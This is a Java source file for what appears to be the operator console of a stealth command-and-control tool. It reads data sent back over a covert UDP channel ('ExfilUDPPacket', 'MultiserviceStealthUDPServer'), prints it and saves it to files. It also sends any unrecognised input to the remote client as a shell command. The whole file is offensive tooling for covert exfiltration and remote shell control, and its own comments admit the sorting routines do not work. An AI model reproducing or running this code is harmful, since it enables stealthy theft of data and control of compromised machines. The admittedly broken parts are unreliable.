package commandline;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Scanner;

import networking.ExfilUDPPacket;
import networking.MultiserviceStealthUDPServer;

public class LocalCommandInterpreter{
	Scanner in;
	ArrayList<String> commands;
	ArrayList<ArrayList<ExfilUDPPacket>> storedMessages;
	public LocalCommandInterpreter(){
		in=new Scanner(System.in);
		commands=new ArrayList<String>();
		storedMessages = new ArrayList<ArrayList<ExfilUDPPacket>>();
		commands.add("/help");
		commands.add("/clear: Clears current UDP buffer");
		commands.add("/save: Saves current UDP buffer");
		commands.add("/read: Prints current UDP buffer to screen");
		commands.add("/history: Show past messages and their indexes");
		commands.add("/file <index> <filename>: Saves a file out of history");
		commands.add("/unsorted <index> <filename>: Saves a file out of history, skipping sorting");
		commands.add("/quit: Stop the server");
	}
	public boolean checkCommand(String command) {
		if(command.startsWith("/")) {
			return true;
		}
		return false;
	}
	public void runCommand(String command) throws IOException {
		if(command.startsWith("/help")) {
			for(String c:commands) {
				System.out.println(c);
			}
			System.out.println("Anything not on the list above will be sent to the client as a shell command");
		}else if(command.startsWith("/clear")) {
			MultiserviceStealthUDPServer.clearRecievedQueue();
		}else if(command.startsWith("/save")) {
			ArrayList<ExfilUDPPacket> file = new ArrayList<ExfilUDPPacket>();
			for(ExfilUDPPacket eup:MultiserviceStealthUDPServer.recieveQueue){
				file.add(eup);
			}
			storedMessages.add(file);
		}else if(command.startsWith("/read")) {
			for(ExfilUDPPacket eup : MultiserviceStealthUDPServer.recieveQueue){
				for(byte b : eup.getData()){
					System.out.print((char)b);
				}
			}
		}else if(command.startsWith("/history")) {
			for(int i =0; i<storedMessages.size(); i++) {
				System.out.println("["+i+"] "+storedMessages.get(i).toString().substring(0,Math.min(storedMessages.get(i).toString().length(), 30)));
			}
		}else if(command.startsWith("/file")){
			System.out.println("[+] File write beginning...");
			try{
				String[] commandParts = command.split(" ");
				int entryNumber=Integer.parseInt(commandParts[1]);
				String fileName=commandParts[2];
				File file = new File(fileName);
				System.out.println("[+] Saving File "+entryNumber+" to ./"+fileName);
				FileOutputStream fileWriter = new FileOutputStream(file);
				System.out.println("[+] File Size: "+storedMessages.get(entryNumber).size());
				byte[] messageData = getSortedMessageBuffer(entryNumber);
				fileWriter.write(messageData);
				fileWriter.close();
				System.out.println("[+] File Write Complete.");
			}catch(Exception e){
				e.printStackTrace();
				System.out.println("Error: Proper Syntax:");
				System.out.println("\n/file <index> <filename>");
			}
			
		}else if(command.startsWith("/unsorted")){
			System.out.println("[+] File write beginning...");
			try{
				String[] commandParts = command.split(" ");
				int entryNumber=Integer.parseInt(commandParts[1]);
				String fileName=commandParts[2];
				File file = new File(fileName);
				System.out.println("[+] Saving File "+entryNumber+" to ./"+fileName);
				FileOutputStream fileWriter = new FileOutputStream(file);
				System.out.println("[+] File Size: "+storedMessages.get(entryNumber).size());
				byte[] messageData = getUnSortedMessageBuffer(entryNumber);
				fileWriter.write(messageData);
				fileWriter.close();
				System.out.println("[+] File Write Complete.");
			}catch(Exception e){
				e.printStackTrace();
				System.out.println("Error: Proper Syntax:");
				System.out.println("\n/unsorted <index> <filename>");
			}
			
		}else if(command.equals("/quit")){
			System.exit(0);
		}else if(command.equals("/debug")){
			int it = 0;
			for(int i : MultiserviceStealthUDPServer.sequencePositions){
				System.out.println((it++)+"	:	"+i);
			}
		}else{
			System.out.println("Unrecognized Command. Available Commands: \n\n");
			for(String c:commands) {
				System.out.println(c);
			}
			System.out.println("Anything not on the list above will be sent to the client as a shell command");
			
		}
	}
	private byte[] getSortedMessageBuffer(int index) { //Yeah, this doesn't work at all.
		System.out.println("[+] Sorting Buffer...");
		ArrayList<ExfilUDPPacket> sorted = new ArrayList<ExfilUDPPacket>();
		sorted.addAll(0, this.storedMessages.get(index));
		Collections.sort(sorted);
		ArrayList<Byte> data = new ArrayList<Byte>();
		for(ExfilUDPPacket eup : sorted){
			for(byte b : eup.getData()){
				data.add(b);
			}
		}
		byte[] output = new byte[data.size()];
		for(int i = 0; i< data.size();i++){
			output[i]=data.get(i);
		}
		return output;
	}
	private byte[] getUnSortedMessageBuffer(int index) { //Yeah, this doesn't work at all.
		System.out.println("[+] Sorting Buffer...");
		ArrayList<ExfilUDPPacket> sorted = new ArrayList<ExfilUDPPacket>();
		sorted.addAll(0, this.storedMessages.get(index));
		//Collections.sort(sorted);
		ArrayList<Byte> data = new ArrayList<Byte>();
		for(ExfilUDPPacket eup : sorted){
			for(byte b : eup.getData()){
				data.add(b);
			}
		}
		byte[] output = new byte[data.size()];
		for(int i = 0; i< data.size();i++){
			output[i]=data.get(i);
		}
		return output;
	}
	
}

